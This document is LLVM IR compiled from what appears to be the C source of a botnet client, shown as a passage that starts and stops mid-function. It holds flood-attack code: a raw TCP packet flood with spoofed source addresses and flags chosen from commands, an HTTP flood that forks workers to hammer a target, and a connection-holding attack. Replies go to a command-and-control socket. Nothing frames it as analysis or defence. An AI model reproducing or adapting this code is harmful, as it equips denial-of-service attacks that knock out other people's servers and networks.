  %110 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %109, i32 0, i32 3
  store i32 0, i32* %110, align 4
  %111 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %112 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %111, i32 0, i32 0
  %113 = bitcast %union.anon.0* %112 to %struct.anon.1*
  %114 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %113, i32 0, i32 4
  %115 = load i16, i16* %114, align 4
  %116 = and i16 %115, -241
  %117 = or i16 %116, 80
  store i16 %117, i16* %114, align 4
  %118 = load i8*, i8** %12, align 8
  %119 = call i32 @strcmp(i8* noundef %118, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.405, i64 0, i64 0)) #11
  %120 = icmp ne i32 %119, 0
  br i1 %120, label %157, label %121

121:                                              ; preds = %74
  %122 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon.0* %123 to %struct.anon.1*
  %125 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon.0* %130 to %struct.anon.1*
  %132 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %131, i32 0, i32 4
  %133 = load i16, i16* %132, align 4
  %134 = and i16 %133, -1025
  %135 = or i16 %134, 1024
  store i16 %135, i16* %132, align 4
  %136 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %137 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %136, i32 0, i32 0
  %138 = bitcast %union.anon.0* %137 to %struct.anon.1*
  %139 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %138, i32 0, i32 4
  %140 = load i16, i16* %139, align 4
  %141 = and i16 %140, -257
  %142 = or i16 %141, 256
  store i16 %142, i16* %139, align 4
  %143 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %144 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %143, i32 0, i32 0
  %145 = bitcast %union.anon.0* %144 to %struct.anon.1*
  %146 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %145, i32 0, i32 4
  %147 = load i16, i16* %146, align 4
  %148 = and i16 %147, -4097
  %149 = or i16 %148, 4096
  store i16 %149, i16* %146, align 4
  %150 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %151 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %150, i32 0, i32 0
  %152 = bitcast %union.anon.0* %151 to %struct.anon.1*
  %153 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %152, i32 0, i32 4
  %154 = load i16, i16* %153, align 4
  %155 = and i16 %154, -2049
  %156 = or i16 %155, 2048
  store i16 %156, i16* %153, align 4
  br label %234

157:                                              ; preds = %74
  %158 = load i8*, i8** %12, align 8
  %159 = call i8* @strtok(i8* noundef %158, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %159, i8** %24, align 8
  br label %160

160:                                              ; preds = %231, %157
  %161 = load i8*, i8** %24, align 8
  %162 = icmp ne i8* %161, null
  br i1 %162, label %163, label %233

163:                                              ; preds = %160
  %164 = load i8*, i8** %24, align 8
  %165 = call i32 @strcmp(i8* noundef %164, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.407, i64 0, i64 0)) #11
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %175, label %167

167:                                              ; preds = %163
  %168 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i32 0, i32 0
  %170 = bitcast %union.anon.0* %169 to %struct.anon.1*
  %171 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %170, i32 0, i32 4
  %172 = load i16, i16* %171, align 4
  %173 = and i16 %172, -513
  %174 = or i16 %173, 512
  store i16 %174, i16* %171, align 4
  br label %231

175:                                              ; preds = %163
  %176 = load i8*, i8** %24, align 8
  %177 = call i32 @strcmp(i8* noundef %176, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.408, i64 0, i64 0)) #11
  %178 = icmp ne i32 %177, 0
  br i1 %178, label %187, label %179

179:                                              ; preds = %175
  %180 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  %182 = bitcast %union.anon.0* %181 to %struct.anon.1*
  %183 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %182, i32 0, i32 4
  %184 = load i16, i16* %183, align 4
  %185 = and i16 %184, -1025
  %186 = or i16 %185, 1024
  store i16 %186, i16* %183, align 4
  br label %230

187:                                              ; preds = %175
  %188 = load i8*, i8** %24, align 8
  %189 = call i32 @strcmp(i8* noundef %188, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.409, i64 0, i64 0)) #11
  %190 = icmp ne i32 %189, 0
  br i1 %190, label %199, label %191

191:                                              ; preds = %187
  %192 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.0* %193 to %struct.anon.1*
  %195 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %194, i32 0, i32 4
  %196 = load i16, i16* %195, align 4
  %197 = and i16 %196, -257
  %198 = or i16 %197, 256
  store i16 %198, i16* %195, align 4
  br label %229

199:                                              ; preds = %187
  %200 = load i8*, i8** %24, align 8
  %201 = call i32 @strcmp(i8* noundef %200, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.410, i64 0, i64 0)) #11
  %202 = icmp ne i32 %201, 0
  br i1 %202, label %211, label %203

203:                                              ; preds = %199
  %204 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.0* %205 to %struct.anon.1*
  %207 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %206, i32 0, i32 4
  %208 = load i16, i16* %207, align 4
  %209 = and i16 %208, -4097
  %210 = or i16 %209, 4096
  store i16 %210, i16* %207, align 4
  br label %228

211:                                              ; preds = %199
  %212 = load i8*, i8** %24, align 8
  %213 = call i32 @strcmp(i8* noundef %212, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.411, i64 0, i64 0)) #11
  %214 = icmp ne i32 %213, 0
  br i1 %214, label %223, label %215

215:                                              ; preds = %211
  %216 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %217 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %216, i32 0, i32 0
  %218 = bitcast %union.anon.0* %217 to %struct.anon.1*
  %219 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %218, i32 0, i32 4
  %220 = load i16, i16* %219, align 4
  %221 = and i16 %220, -2049
  %222 = or i16 %221, 2048
  store i16 %222, i16* %219, align 4
  br label %227

223:                                              ; preds = %211
  %224 = load i32, i32* @mainCommSock, align 4
  %225 = load i8*, i8** %24, align 8
  %226 = call i32 (i32, i8*, ...) @sockprintf(i32 noundef %224, i8* noundef getelementptr inbounds ([18 x i8], [18 x i8]* @.str.412, i64 0, i64 0), i8* noundef %225)
  br label %227

227:                                              ; preds = %223, %215
  br label %228

228:                                              ; preds = %227, %203
  br label %229

229:                                              ; preds = %228, %191
  br label %230

230:                                              ; preds = %229, %179
  br label %231

231:                                              ; preds = %230, %167
  %232 = call i8* @strtok(i8* noundef null, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.406, i64 0, i64 0)) #12
  store i8* %232, i8** %24, align 8
  br label %160, !llvm.loop !49

233:                                              ; preds = %160
  br label %234

234:                                              ; preds = %233, %121
  %235 = call i32 @rand_cmwc()
  %236 = trunc i32 %235 to i16
  %237 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %238 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %237, i32 0, i32 0
  %239 = bitcast %union.anon.0* %238 to %struct.anon.1*
  %240 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %239, i32 0, i32 5
  store i16 %236, i16* %240, align 2
  %241 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 0
  %243 = bitcast %union.anon.0* %242 to %struct.anon.1*
  %244 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %243, i32 0, i32 6
  store i16 0, i16* %244, align 4
  %245 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 0
  %247 = bitcast %union.anon.0* %246 to %struct.anon.1*
  %248 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %247, i32 0, i32 7
  store i16 0, i16* %248, align 2
  %249 = load i32, i32* %9, align 4
  %250 = icmp eq i32 %249, 0
  br i1 %250, label %251, label %253

251:                                              ; preds = %234
  %252 = call i32 @rand_cmwc()
  br label %258

253:                                              ; preds = %234
  %254 = load i32, i32* %9, align 4
  %255 = trunc i32 %254 to i16
  %256 = call zeroext i16 @htons(i16 noundef zeroext %255) #15
  %257 = zext i16 %256 to i32
  br label %258

258:                                              ; preds = %253, %251
  %259 = phi i32 [ %252, %251 ], [ %257, %253 ]
  %260 = trunc i32 %259 to i16
  %261 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 0
  %263 = bitcast %union.anon.0* %262 to %struct.anon.1*
  %264 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %263, i32 0, i32 1
  store i16 %260, i16* %264, align 2
  %265 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %266 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %267 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %265, %struct.tcphdr* noundef %266)
  %268 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 0
  %270 = bitcast %union.anon.0* %269 to %struct.anon.1*
  %271 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %270, i32 0, i32 6
  store i16 %267, i16* %271, align 4
  %272 = bitcast i8* %79 to i16*
  %273 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %274 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %273, i32 0, i32 2
  %275 = load i16, i16* %274, align 2
  %276 = zext i16 %275 to i32
  %277 = call zeroext i16 @csum(i16* noundef %272, i32 noundef %276)
  %278 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 7
  store i16 %277, i16* %279, align 2
  %280 = call i64 @time(i64* noundef null) #12
  %281 = load i32, i32* %10, align 4
  %282 = sext i32 %281 to i64
  %283 = add nsw i64 %280, %282
  %284 = trunc i64 %283 to i32
  store i32 %284, i32* %25, align 4
  store i32 0, i32* %26, align 4
  br label %285

285:                                              ; preds = %342, %341, %258
  br label %286

286:                                              ; preds = %285
  %287 = load i32, i32* %17, align 4
  %288 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %289 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %289, %struct.sockaddr** %288, align 8
  %290 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %291 = load %struct.sockaddr*, %struct.sockaddr** %290, align 8
  %292 = call i64 @sendto(i32 noundef %287, i8* noundef %79, i64 noundef %77, i32 noundef 0, %struct.sockaddr* %291, i32 noundef 16)
  %293 = load i32, i32* %19, align 4
  %294 = call i32 (i32, ...) bitcast (i32 ()* @getDatIP to i32 (i32, ...)*)(i32 noundef %293)
  %295 = call i32 @htonl(i32 noundef %294) #15
  %296 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 8
  store i32 %295, i32* %297, align 4
  %298 = call i32 @rand_cmwc()
  %299 = trunc i32 %298 to i16
  %300 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 3
  store i16 %299, i16* %301, align 4
  %302 = call i32 @rand_cmwc()
  %303 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %304 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %303, i32 0, i32 0
  %305 = bitcast %union.anon.0* %304 to %struct.anon.1*
  %306 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %305, i32 0, i32 2
  store i32 %302, i32* %306, align 4
  %307 = call i32 @rand_cmwc()
  %308 = trunc i32 %307 to i16
  %309 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 0
  %311 = bitcast %union.anon.0* %310 to %struct.anon.1*
  %312 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %311, i32 0, i32 0
  store i16 %308, i16* %312, align 4
  %313 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %314 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %313, i32 0, i32 0
  %315 = bitcast %union.anon.0* %314 to %struct.anon.1*
  %316 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %315, i32 0, i32 6
  store i16 0, i16* %316, align 4
  %317 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %318 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %319 = call zeroext i16 @tcpcsum(%struct.iphdr* noundef %317, %struct.tcphdr* noundef %318)
  %320 = load %struct.tcphdr*, %struct.tcphdr** %23, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon.0* %321 to %struct.anon.1*
  %323 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %322, i32 0, i32 6
  store i16 %319, i16* %323, align 4
  %324 = bitcast i8* %79 to i16*
  %325 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 2
  %327 = load i16, i16* %326, align 2
  %328 = zext i16 %327 to i32
  %329 = call zeroext i16 @csum(i16* noundef %324, i32 noundef %328)
  %330 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 7
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* %26, align 4
  %333 = load i32, i32* %15, align 4
  %334 = icmp eq i32 %332, %333
  br i1 %334, label %335, label %342

335:                                              ; preds = %286
  %336 = call i64 @time(i64* noundef null) #12
  %337 = load i32, i32* %25, align 4
  %338 = sext i32 %337 to i64
  %339 = icmp sgt i64 %336, %338
  br i1 %339, label %340, label %341

340:                                              ; preds = %335
  br label %345

341:                                              ; preds = %335
  store i32 0, i32* %26, align 4
  br label %285

342:                                              ; preds = %286
  %343 = load i32, i32* %26, align 4
  %344 = add i32 %343, 1
  store i32 %344, i32* %26, align 4
  br label %285

345:                                              ; preds = %340
  %346 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %346)
  br label %347

347:                                              ; preds = %345, %61, %53, %46
  ret void
}

; Function Attrs: nounwind
declare i8* @strtok(i8* noundef, i8* noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendHTTP(i8* noundef %0, i8* noundef %1, i16 noundef zeroext %2, i8* noundef %3, i32 noundef %4, i32 noundef %5) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [3 x i8*], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [512 x i8], align 16
  %17 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %18 = bitcast [3 x i8*]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %18, i8* align 16 bitcast ([3 x i8*]* @__const.sendHTTP.connections to i8*), i64 24, i1 false)
  %19 = call i64 @time(i64* noundef null) #12
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = add nsw i64 %19, %21
  %23 = trunc i64 %22 to i32
  store i32 %23, i32* %15, align 4
  %24 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i64 0, i64 0
  %25 = load i8*, i8** %7, align 8
  %26 = load i8*, i8** %10, align 8
  %27 = call i32 @rand() #12
  %28 = srem i32 %27, 3
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [3 x i8*], [3 x i8*]* %13, i64 0, i64 %29
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @rand() #12
  %33 = sext i32 %32 to i64
  %34 = urem i64 %33, 36
  %35 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %34
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %24, i8* noundef getelementptr inbounds ([64 x i8], [64 x i8]* @.str.416, i64 0, i64 0), i8* noundef %25, i8* noundef %26, i8* noundef %31, i8* noundef %36) #12
  store i32 0, i32* %14, align 4
  br label %38

38:                                               ; preds = %68, %6
  %39 = load i32, i32* %14, align 4
  %40 = load i32, i32* %12, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %71

42:                                               ; preds = %38
  %43 = call i32 @fork() #12
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %67

45:                                               ; preds = %42
  br label %46

46:                                               ; preds = %65, %45
  %47 = load i32, i32* %15, align 4
  %48 = sext i32 %47 to i64
  %49 = call i64 @time(i64* noundef null) #12
  %50 = icmp sgt i64 %48, %49
  br i1 %50, label %51, label %66

51:                                               ; preds = %46
  %52 = load i8*, i8** %8, align 8
  %53 = load i16, i16* %9, align 2
  %54 = call i32 @socket_connect(i8* noundef %52, i16 noundef zeroext %53)
  store i32 %54, i32* %17, align 4
  %55 = load i32, i32* %17, align 4
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %65

57:                                               ; preds = %51
  %58 = load i32, i32* %17, align 4
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i64 0, i64 0
  %60 = getelementptr inbounds [512 x i8], [512 x i8]* %16, i64 0, i64 0
  %61 = call i64 @strlen(i8* noundef %60) #11
  %62 = call i64 @write(i32 noundef %58, i8* noundef %59, i64 noundef %61)
  %63 = load i32, i32* %17, align 4
  %64 = call i32 @close(i32 noundef %63)
  br label %65

65:                                               ; preds = %57, %51
  br label %46, !llvm.loop !50

66:                                               ; preds = %46
  call void @exit(i32 noundef 1) #16
  unreachable

67:                                               ; preds = %42
  br label %68

68:                                               ; preds = %67
  %69 = load i32, i32* %14, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %14, align 4
  br label %38, !llvm.loop !51

71:                                               ; preds = %38
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @sendHOLD(i8* noundef %0, i32 noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  %12 = alloca %struct.__sigset_t, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.__sigset_t*, align 8
  %21 = alloca i32, align 4
  %22 = alloca %struct.__sigset_t*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %23 = call i32 @getdtablesize() #12
  %24 = sdiv i32 %23, 2
  store i32 %24, i32* %7, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %5, align 4
  %27 = trunc i32 %26 to i16
  %28 = call zeroext i16 @htons(i16 noundef zeroext %27) #15
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %28, i16* %29, align 2
  %30 = load i8*, i8** %4, align 8
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %32 = call i32 @getHost(i8* noundef %30, %struct.in_addr* noundef %31)
  %33 = icmp ne i32 %32, 0
  br i1 %33, label %34, label %35

34:                                               ; preds = %3
  br label %273

35:                                               ; preds = %3
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 4 %37, i8 0, i64 8, i1 false)
  %38 = load i32, i32* %7, align 4
  %39 = zext i32 %38 to i64
  %40 = call i8* @llvm.stacksave()
  store i8* %40, i8** %10, align 8
  %41 = alloca %struct.state_t, i64 %39, align 16
  store i64 %39, i64* %11, align 8
  %42 = bitcast %struct.state_t* %41 to i8*
  %43 = load i32, i32* %7, align 4
  %44 = sext i32 %43 to i64
  %45 = mul i64 %44, 5
  call void @llvm.memset.p0i8.i64(i8* align 16 %42, i8 0, i64 %45, i1 false)
  %46 = call i64 @time(i64* noundef null) #12
  %47 = load i32, i32* %6, align 4
  %48 = sext i32 %47 to i64
  %49 = add nsw i64 %46, %48
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %17, align 4
  br label %51

51:                                               ; preds = %270, %35
  %52 = load i32, i32* %17, align 4
  %53 = sext i32 %52 to i64
  %54 = call i64 @time(i64* noundef null) #12
  %55 = icmp sgt i64 %53, %54
  br i1 %55, label %56, label %271

56:                                               ; preds = %51
  store i32 0, i32* %8, align 4
  br label %57

57:                                               ; preds = %267, %56
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %270

61:                                               ; preds = %57
  %62 = load i32, i32* %8, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %63
  %65 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i32 0, i32 1
  %66 = load i8, i8* %65, align 4
  %67 = zext i8 %66 to i32
  switch i32 %67, label %266 [
    i32 0, label %68
    i32 1, label %115
    i32 2, label %206
  ]

68:                                               ; preds = %61
  %69 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #12
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  store i32 %69, i32* %73, align 8
  %74 = load i32, i32* %8, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 0
  %78 = load i32, i32* %77, align 8
  %79 = load i32, i32* %8, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %80
  %82 = getelementptr inbounds %struct.state_t, %struct.state_t* %81, i32 0, i32 0
  %83 = load i32, i32* %82, align 8
  %84 = call i32 (i32, i32, ...) @fcntl(i32 noundef %83, i32 noundef 3, i8* noundef null)
  %85 = or i32 %84, 2048
  %86 = call i32 (i32, i32, ...) @fcntl(i32 noundef %78, i32 noundef 4, i32 noundef %85)
  %87 = load i32, i32* %8, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %88
  %90 = getelementptr inbounds %struct.state_t, %struct.state_t* %89, i32 0, i32 0
  %91 = load i32, i32* %90, align 8
  %92 = bitcast %union.__CONST_SOCKADDR_ARG* %18 to %struct.sockaddr**
  %93 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %93, %struct.sockaddr** %92, align 8
  %94 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %18, i32 0, i32 0
  %95 = load %struct.sockaddr*, %struct.sockaddr** %94, align 8
  %96 = call i32 @connect(i32 noundef %91, %struct.sockaddr* %95, i32 noundef 16)
  %97 = icmp ne i32 %96, -1
  br i1 %97, label %102, label %98

98:                                               ; preds = %68
  %99 = call i32* @__errno_location() #15
  %100 = load i32, i32* %99, align 4
  %101 = icmp ne i32 %100, 115
  br i1 %101, label %102, label %109

102:                                              ; preds = %98, %68
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 8
  %108 = call i32 @close(i32 noundef %107)
  br label %114

109:                                              ; preds = %98
  %110 = load i32, i32* %8, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %111
  %113 = getelementptr inbounds %struct.state_t, %struct.state_t* %112, i32 0, i32 1
  store i8 1, i8* %113, align 4
  br label %114

114:                                              ; preds = %109, %102
  br label %266

115:                                              ; preds = %61
  br label %116

116:                                              ; preds = %115
  store %struct.__sigset_t* %12, %struct.__sigset_t** %20, align 8
  store i32 0, i32* %19, align 4
  br label %117

117:                                              ; preds = %127, %116
  %118 = load i32, i32* %19, align 4
  %119 = zext i32 %118 to i64
  %120 = icmp ult i64 %119, 16
  br i1 %120, label %121, label %130

121:                                              ; preds = %117
  %122 = load %struct.__sigset_t*, %struct.__sigset_t** %20, align 8
  %123 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %122, i32 0, i32 0
  %124 = load i32, i32* %19, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds [16 x i64], [16 x i64]* %123, i64 0, i64 %125
  store i64 0, i64* %126, align 8
  br label %127

127:                                              ; preds = %121
  %128 = load i32, i32* %19, align 4
  %129 = add i32 %128, 1
  store i32 %129, i32* %19, align 4
  br label %117, !llvm.loop !52

130:                                              ; preds = %117
  br label %131

131:                                              ; preds = %130
  br label %132

132:                                              ; preds = %131
  %133 = load i32, i32* %8, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %134
  %136 = getelementptr inbounds %struct.state_t, %struct.state_t* %135, i32 0, i32 0
  %137 = load i32, i32* %136, align 8
  %138 = srem i32 %137, 64
  %139 = zext i32 %138 to i64
  %140 = shl i64 1, %139
  %141 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %142 = load i32, i32* %8, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %143
  %145 = getelementptr inbounds %struct.state_t, %struct.state_t* %144, i32 0, i32 0
  %146 = load i32, i32* %145, align 8
  %147 = sdiv i32 %146, 64
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [16 x i64], [16 x i64]* %141, i64 0, i64 %148
  %150 = load i64, i64* %149, align 8
  %151 = or i64 %150, %140
  store i64 %151, i64* %149, align 8
  %152 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %152, align 8
  %153 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 10000, i64* %153, align 8
  %154 = load i32, i32* %8, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %155
  %157 = getelementptr inbounds %struct.state_t, %struct.state_t* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = add nsw i32 %158, 1
  %160 = call i32 @select(i32 noundef %159, %struct.__sigset_t* noundef null, %struct.__sigset_t* noundef %12, %struct.__sigset_t* noundef null, %struct.timeval* noundef %13)
  store i32 %160, i32* %16, align 4
  %161 = load i32, i32* %16, align 4
  %162 = icmp eq i32 %161, 1
  br i1 %162, label %163, label %190

163:                                              ; preds = %132
  store i32 4, i32* %14, align 4
  %164 = load i32, i32* %8, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 %165
  %167 = getelementptr inbounds %struct.state_t, %struct.state_t* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 8
  %169 = bitcast i32* %15 to i8*
  %170 = call i32 @getsockopt(i32 noundef %168, i32 noundef 1, i32 noundef 4, i8* noundef %169, i32* noundef %14) #12
